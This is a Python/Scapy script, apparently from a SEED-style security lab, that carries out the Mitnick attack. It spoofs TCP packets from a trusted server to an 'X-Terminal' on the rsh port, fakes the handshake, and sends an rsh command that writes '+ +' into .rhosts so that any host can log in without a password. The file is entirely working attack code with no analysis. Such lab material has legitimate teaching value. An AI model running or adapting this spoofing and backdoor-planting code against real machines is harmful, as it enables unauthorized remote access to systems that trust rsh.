from scapy.all import *
import sys
import time

interface = sys.argv[1] # Network interface
x_ip = "10.9.0.5" # X-Terminal
x_port = 514 # Port number used by X-Terminal
srv_ip = "10.9.0.6" # The trusted server
srv_port = 1023 # Port number used by the trusted server

ip = IP(src=srv_ip, dst=x_ip) # IP package for sending messages
done = False # Flag to stop program

def spoof(pkt):
    global done

    rec_ip = pkt[IP] # Received IP package
    rec_tcp = pkt[TCP] # Received TCP package
    
    rec_flags = rec_tcp.flags # Received flags
    rec_ack = rec_tcp.ack # Received ACK number
    rec_seq = rec_tcp.seq # Received sequence number

    print("Received message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(rec_ip.src, rec_tcp.sport, rec_ip.dst, rec_tcp.dport, rec_flags, rec_ack, rec_seq))

    # Ignore messages received from IP's other than X-Terminal 
    if rec_ip.src != "10.9.0.5":
        return
    
    # If received a SYN, replies with SYN ACK
    if rec_flags == "S":
        tcp = TCP(sport=rec_tcp.dport, dport=rec_tcp.sport, flags="SA", seq=100, ack=rec_seq+1)
        send(ip/tcp, verbose=0)
        print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))
    # If received a FIN, replies with FIN ACK
    elif "F" in rec_flags:
        tcp = TCP(sport=rec_tcp.dport, dport=rec_tcp.sport, flags="FA", seq=rec_ack, ack=rec_seq+1)
        send(ip/tcp, verbose=0)
        print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))
        if done:
            sys.exit()
        done = True
    # If received ACK for the first message, replies with another ACK and send RSH message
    elif rec_ack == 1:
        tcp = TCP(sport=rec_tcp.dport, dport=rec_tcp.sport, flags="A", seq=1, ack=rec_seq+1)
        send(ip/tcp, verbose=0)
        print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))

        tcp = TCP(sport=rec_tcp.dport, dport=rec_tcp.sport, flags="PA", seq=1, ack=rec_seq+1)
        # Puts + + string in .rhosts
        data = "1023\x00seed\x00seed\x00echo + + > .rhosts\x00"
        send(ip/tcp/data, verbose=0)
        print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))
    # If received ACK for the second message, replies with another ACK
    elif rec_ack == 35:
        tcp = TCP(sport=rec_tcp.dport, dport=rec_tcp.sport, flags="A", seq=35, ack=rec_seq+1)
        send(ip/tcp, verbose=0)
        print("Sent message: {}:{} -> {}:{} Flags={} Ack={} Seq={}".format(ip.src, tcp.sport, rec_ip.dst, tcp.dport, tcp.flags, tcp.ack, tcp.seq))


# Opens TCP connection with X-Terminal
tcp = TCP(sport=srv_port, dport=x_port, flags="S", seq=0)
send(ip/tcp)

# Trusted Server will be able to send reset, wait some time and send SYN again
time.sleep(4)
send(ip/tcp)

# Sniffs packets received
myFilter = "tcp"
sniff(iface=interface, filter=myFilter, prn=spoof)